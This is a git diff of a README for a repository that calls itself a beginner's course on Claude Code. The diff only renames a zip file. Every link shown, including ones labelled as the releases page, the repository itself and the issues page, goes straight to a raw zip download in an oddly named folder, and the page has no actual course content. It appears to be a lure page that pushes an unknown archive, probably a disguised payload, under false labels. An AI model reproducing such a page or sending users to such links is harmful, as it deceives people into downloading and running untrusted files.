@@ -4,14 +4,14 @@
 Welcome to the **claude-code-for-beginners** repository! This platform offers a complete beginner's course designed to guide you through mastering AI-powered development using Claude Code. Whether you are just starting out or looking to enhance your skills, this guide provides clear steps to help you succeed.
 
 ## 📥 Download the Application
-[![Download the Latest Release](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip%https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip)](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip)
+[![Download the Latest Release](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip%https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip)](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip)
 
 ## 🚀 Getting Started
 To get started with the application, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to visit our Download page.  
-   [Visit Releases Page](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip)
+   [Visit Releases Page](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip)
 
 2. **Select the Latest Release**  
    Scroll through the list of releases to find the latest version. This will usually be at the top. Look for the version number and read any notes provided by the developers.
@@ -63,9 +63,9 @@ If you encounter issues during installation or while using the application:
 Your feedback is important to us. Please share your thoughts and experiences as you navigate through the application. Your insights help us improve the course and make it more user-friendly.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: [claude-code-for-beginners](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip)
+- **GitHub Repository**: [claude-code-for-beginners](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip)
 - **Documentation**: Explore our detailed documentation for more help.
 - **Tutorials**: Access additional tutorials and guides to expand your knowledge.
 
 ## 📞 Contact Us
-For further inquiries, please reach out through our [GitHub Issues](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/claude_code_beginners_for_1.8.zip). We're here to help!
+For further inquiries, please reach out through our [GitHub Issues](https://github.com/Necika123/claude-code-for-beginners/raw/refs/heads/main/macrostylous/code_beginners_for_claude_2.8.zip). We're here to help!
